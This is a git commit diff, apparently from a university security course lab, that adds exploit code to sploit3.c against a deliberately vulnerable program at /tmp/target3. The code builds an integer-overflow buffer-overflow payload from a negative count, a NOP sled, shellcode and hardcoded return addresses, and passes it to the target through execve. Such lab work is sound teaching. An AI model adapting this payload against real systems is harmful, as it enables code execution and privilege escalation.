ba4a4eb18f3374c30cb3ac1b07f4af72b629a798
ab <arbeers@wisc.edu>
2023-02-12 10:19:15 -0600

    sploit3 done

--- sploits/sploit3.c
+++ sploits/sploit3.c
@@ -6,12 +6,28 @@
 
 #define TARGET "/tmp/target3"
 
+struct widget_t {
+  int x;
+  int y;
+  double z;
+};
+
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char crack_str[2668];
+  int i;
+
+  strcpy(crack_str, "-2147483482,");
+  for(i = 12; i < 2607; i++) crack_str[i] = '\x90';
+  strcpy(&crack_str[2607], shellcode);
+  for(i = 2652; i < 2668; i+=4) strcpy(&crack_str[i], "\x90\xed\xff\xbf");
+
+  args[0] = TARGET;
+  args[1] = crack_str;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
